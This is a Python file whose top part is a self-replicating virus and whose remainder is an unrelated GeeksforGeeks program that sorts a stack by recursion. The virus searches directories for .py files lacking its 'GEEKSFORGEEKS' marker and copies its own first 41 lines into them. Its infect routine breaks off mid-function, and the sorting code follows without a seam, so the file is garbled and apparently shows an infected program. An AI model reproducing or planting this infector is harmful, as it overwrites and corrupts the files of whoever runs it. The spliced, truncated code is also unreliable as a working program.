#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to sort a stack using recursion
 
# Recursive method to insert element in sorted way
 
 
def sortedInsert(s, element):
 
    # Base case: Either stack is empty or newly inserted
    # item is greater than top (more than all existing)
    if len(s) == 0 or element > s[-1]:
        s.append(element)
        return
    else:
 
        # Remove the top item and recur
        temp = s.pop()
        sortedInsert(s, element)
 
        # Put back the top item removed earlier
        s.append(temp)
 
# Method to sort stack
 
 
def sortStack(s):
 
    # If stack is not empty
    if len(s) != 0:
 
        # Remove the top item
        temp = s.pop()
 
        # Sort remaining stack
        sortStack(s)
 
        # Push the top item back in sorted stack
        sortedInsert(s, temp)
 
# Printing contents of stack
 
 
def printStack(s):
    for i in s[::-1]:
        print(i, end=" ")
    print()
 
 
# Driver Code
if __name__ == '__main__':
    s = []
    s.append(30)
    s.append(-5)
    s.append(18)
    s.append(14)
    s.append(-3)
 
    print("Stack elements before sorting: ")
    printStack(s)
 
    sortStack(s)
 
    print("\nStack elements after sorting: ")
    printStack(s)
 
# This code is contributed by Muskan Kalra.
# Time Complexity: O(N^2)
# Space Complexity: O(N) use of Stack